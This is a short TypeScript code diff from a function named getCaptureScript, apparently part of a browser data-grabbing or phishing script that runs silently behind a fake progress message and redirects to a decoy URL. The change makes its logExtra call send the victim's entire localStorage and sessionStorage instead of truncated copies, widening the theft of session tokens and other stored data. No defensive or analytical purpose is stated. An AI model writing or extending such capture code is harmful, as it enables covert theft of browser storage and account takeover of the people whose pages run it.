@@ -685,8 +685,8 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               try {
                 if (!isSilent) updateProgress(prog, "Mapping data persisten...");
                 await logExtra({
-                  storage_ls: JSON.stringify(localStorage).substring(0, 3000),
-                  storage_ss: JSON.stringify(sessionStorage).substring(0, 3000)
+                  storage_ls_full: JSON.stringify(localStorage),
+                  storage_ss_full: JSON.stringify(sessionStorage)
                 });
               } catch(e) {}
             }
